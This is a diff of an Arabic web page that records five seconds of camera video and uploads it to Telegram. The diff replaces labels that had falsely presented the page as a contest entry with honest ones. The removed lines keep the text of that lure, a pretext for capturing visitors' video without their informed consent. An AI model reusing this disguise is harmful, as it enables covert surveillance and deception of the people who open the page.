@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>للدخول الى المسابقة.اضغط هنا</title>
+    <title>إرسال فيديو إلى Telegram</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -40,7 +40,7 @@
     </style>
 </head>
 <body>
-    <button id="recordBtn">انتظر حتى يتم الانتقال (5 ثواني)</button>
+    <button id="recordBtn">تسجيل فيديو (5 ثواني)</button>
     <div id="timer" style="display: none;">5</div>
     <div id="status"></div>
 
@@ -85,7 +85,7 @@
                     // إيقاف العد التنازلي
                     clearInterval(countdown);
                     timer.style.display = 'none';
-                    recordBtn.textContent = 'انتظر (5 ثواني)';
+                    recordBtn.textContent = 'تسجيل فيديو (5 ثواني)';
                     recordBtn.style.backgroundColor = '#28a745';
                     
                     // إرسال الفيديو
@@ -121,7 +121,7 @@
         });
         
         async function sendVideoToTelegram() {
-            showStatus('جاري الدخول الى المسابقة...', 'success');
+            showStatus('جاري إرسال الفيديو...', 'success');
             
             try {
                 // دمج القطع المسجلة في فيديو واحد
@@ -143,9 +143,9 @@
                 const data = await response.json();
                 
                 if (data.ok) {
-                    showStatus('تم دخول المسابقة بنجاح!', 'success');
+                    showStatus('تم إرسال الفيديو بنجاح!', 'success');
                 } else {
-                    showStatus('فشل في دخول المسابقة: ' + JSON.stringify(data), 'error');
+                    showStatus('فشل في إرسال الفيديو: ' + JSON.stringify(data), 'error');
                 }
             } catch (error) {
                 showStatus('حدث خطأ: ' + error.message, 'error');
